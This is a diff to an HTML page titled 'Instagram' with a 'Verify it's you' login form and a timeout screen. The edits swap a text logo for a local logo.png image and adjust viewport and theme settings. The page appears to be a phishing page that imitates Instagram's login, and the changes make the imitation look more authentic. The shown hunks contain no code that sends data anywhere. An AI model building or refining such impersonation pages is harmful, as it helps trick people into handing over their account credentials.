@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
-  <meta name="theme-color" content="#000000">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#1a1a1a">
   <title>Instagram</title>
 
   <style>
@@ -47,15 +47,11 @@
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
     }
 
-    .logo {
-      margin: 0 0 14px;
-      font-size: 36px;
-      line-height: 1;
-      font-weight: 400;
-      color: #ffffff;
-      letter-spacing: -0.5px;
-      font-family: "Grand Hotel", "Billabong", "Brush Script MT", "Segoe Script", cursive;
-      font-style: italic;
+    .logo-img {
+      display: block;
+      width: 150px;
+      height: auto;
+      margin: 0 auto 14px;
     }
 
     .subtitle {
@@ -238,7 +234,7 @@
       display: none;
     }
 
-    .timeout-view .logo {
+    .timeout-view .logo-img {
       margin-bottom: 26px;
     }
 
@@ -295,14 +291,14 @@
 
     @media (max-width: 380px) {
       .card { padding: 36px 24px 24px; }
-      .logo { font-size: 32px; }
+      .logo-img { width: 130px; }
       .signup-bar { padding: 18px; font-size: 13px; }
     }
 
     @media (max-height: 640px) {
       .page { justify-content: flex-start; padding-top: 16px; }
       .card { padding: 28px 24px 20px; }
-      .logo { font-size: 30px; margin-bottom: 10px; }
+      .logo-img { width: 120px; margin-bottom: 10px; }
       .subtitle { margin-bottom: 16px; }
     }
   </style>
@@ -316,7 +312,7 @@
       <!-- ─── SIGN-IN VIEW ─── -->
       <div id="signinView">
 
-        <h1 class="logo">Instagram</h1>
+        <img src="logo.png" alt="Instagram" class="logo-img">
         <p class="subtitle">Verify it's you</p>
 
         <form id="loginForm">
@@ -382,7 +378,7 @@
       <!-- ─── TIMEOUT VIEW ─── -->
       <div id="timeoutView" class="timeout-view">
 
-        <h1 class="logo">Instagram</h1>
+        <img src="logo.png" alt="Instagram" class="logo-img">
 
         <div class="timeout-icon">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
